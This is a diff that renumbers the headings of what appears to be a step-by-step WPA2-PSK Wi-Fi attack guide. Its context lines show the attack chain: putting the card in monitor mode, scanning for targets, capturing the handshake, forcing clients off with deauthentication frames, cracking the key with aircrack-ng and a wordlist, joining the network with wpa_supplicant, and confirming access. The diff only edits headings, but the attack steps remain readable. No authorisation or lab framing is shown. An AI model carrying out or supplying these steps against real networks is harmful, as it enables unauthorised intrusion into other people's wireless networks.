@@ -2,7 +2,7 @@
 # 🛡️ WPA2-PSK Attack
 ## Time to perform the attack: 7 minutes
 
-## ⚙️ 0. Initial Setup
+## ⚙️ Initial Setup
 
 ```bash
 sudo airmon-ng check kill
@@ -13,7 +13,7 @@ Monitor mode enabled on `wlan0mon`.
 
 ---
 
-## 🔍 1. Scan for Targets
+## 🔍 Scan for Targets
 
 Since WPA2 works both on 2,4Ghz and 5Ghz, check what access points (APs) are active on those frequencies.
 **To recognize them check for WPA2-PSK and Cipher CCMP**
@@ -39,7 +39,7 @@ sudo airodump-ng -c ${channel} wlan0mon
 
 ---
 
-## 🎯 2. Capture Handshake
+## 🎯 Capture Handshake
 
 It's time to Capture the Handshake and for this we'll capture an **authentication handshake**.
 
@@ -58,7 +58,7 @@ Keep this running! **You're sniffing for the WPA handshake**.
 
 ---
 
-## 💣 3. Force Handshake with Deauth
+## 💣 Force Handshake with Deauth
 
 In a second terminal tab.
 Send a deauthentication frame to the choosen client.
@@ -76,7 +76,7 @@ At this point come back to terminal 1 and check if a WPA handshake is captured.
 
 ---
 
-## 👁️ 4. Confirm Handshake
+## 👁️ Confirm Handshake
 
 In the top-right corner of `airodump-ng`output, look for:
 
@@ -92,7 +92,7 @@ sudo airmon-ng stop wlan0mon
 ```
 ---
 
-## 🔓 5. Crack the Password
+## 🔓 Crack the Password
 
 ```bash
 wordlist='/usr/share/john/password.lst'
@@ -106,7 +106,7 @@ aircrack-ng -w ${wordlist} -e ${essid} -b ${bssid} ${dumpfile}-01.cap
 **Substitute `john wordlist` with rockyou.txt if needed.**
 ---
 
-## 🔌 6. Connect Using wpa_supplicant
+## 🔌 Connect Using wpa_supplicant
 
 ### wpa2.conf
 
@@ -142,7 +142,7 @@ sudo dhclient wlan0 -v
 ```
 ---
 
-## ✅ 7. Confirm Network Access
+## ✅ Confirm Network Access
 
 ```bash
 target=192.168.2.1
